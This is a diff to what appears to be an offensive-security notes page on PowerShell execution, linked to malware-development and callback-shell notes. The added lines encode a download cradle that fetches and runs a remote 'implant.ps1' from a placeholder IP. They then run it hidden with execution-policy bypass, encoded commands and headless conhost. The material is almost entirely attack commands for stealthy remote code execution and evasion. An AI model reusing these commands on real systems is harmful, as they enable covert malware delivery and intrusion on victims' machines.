@@ -62,6 +62,28 @@ C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f she
 C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f shell.ps1
 ```
 
+### Base64 encoded
+
+Encode the string of commands.
+
+```
+$ str="IEX ((New-Object Net.WebClient).DownloadString('http://<IP>/implant.ps1'))"
+
+$ echo -en $str | iconv -t UTF-16LE | base64 -w 0
+
+$ echo -en $str | iconv -t UTF-16LE | basenc -w 0 --base64
+
+$ echo -en $str | iconv -t UTF-16LE | openssl enc -base64 -A
+
+$ echo -en $str | iconv -t UTF-16LE | openssl enc -a -e -A
+```
+
+Then execute it in a one-liner.
+
+```
+C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
+```
+
 ### Execution Policy
 
 ```
@@ -83,11 +105,17 @@ C:\> conhost --headless <commands>
 ```
 
 ```
-C:\> conhost.exe--headless powershell.exe -noni -nop -ep bypass -file implant.ps1
+C:\> conhost.exe --headless powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
+
+C:\> conhost.exe --headless powershell.exe -noni -nop -ep bypass -file implant.ps1
 ```
 
 ---
 ## References
+
+- [[03 - Malware Development/Helpers/Evasion/Obfuscation Techniques/Cross Platform/PowerShell||Malware Development: PowerShell Obfuscation Techniques]]
+
+- [[Batch|Malware Development: Batch Obfuscation Techniques]]
 
 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Callback Shells/One-Liners/Windows/Reverse Shells/Powershell|Callback Shells: Powershell]]
 
